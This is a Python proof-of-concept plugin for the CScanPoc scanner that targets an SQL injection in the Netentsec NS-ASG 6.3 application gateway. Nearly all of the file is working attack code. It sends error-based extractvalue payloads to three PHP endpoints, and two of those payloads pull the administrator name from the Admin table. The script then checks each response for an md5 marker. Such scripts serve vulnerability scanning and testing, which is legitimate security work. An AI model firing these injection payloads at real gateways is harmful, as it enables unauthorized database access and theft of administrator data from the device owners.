# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Netentsec_0009'  # 平台漏洞编号，留空
    name = '网康科技应用网关NS—ASG 6.3通用性sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-10-11'  # 漏洞公布时间
    desc = '''
        网康科技应用网关NS—ASG 6.3通用性sql注入
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=073991'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '网康应用安全网关'  # 漏洞应用名称
    product_version = '6.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ad7112fd-0c0e-4294-a36b-917e181dca15'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            ps = [
                "/vpnweb/resetpwd/resetpwd.php?action=update&UserId=extractvalue(0x1,%20concat(0x1,%20(select%20md5(1))))",
                "/WebPages/singlelogin.php?loginId=1 %20and%20extractvalue(0x1,%20concat(0x1,%20(select%20concat(adminname,%200x7e,%20md5(1))%20from%20Admin%20limit%201)))%20%23&submit=t",
                "/WebPages/history.php?uid=1%20and%20extractvalue(0x1,%20concat(0x1,%20(select%20concat(adminname,%200x7e,%20md5(1))%20from%20Admin%20limit%201)))",
            ]
            for p in ps:
                url = arg+p
                res = requests.get(url)
                if res.status_code == 200 and "c4ca4238a0b923820dcc" in res.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
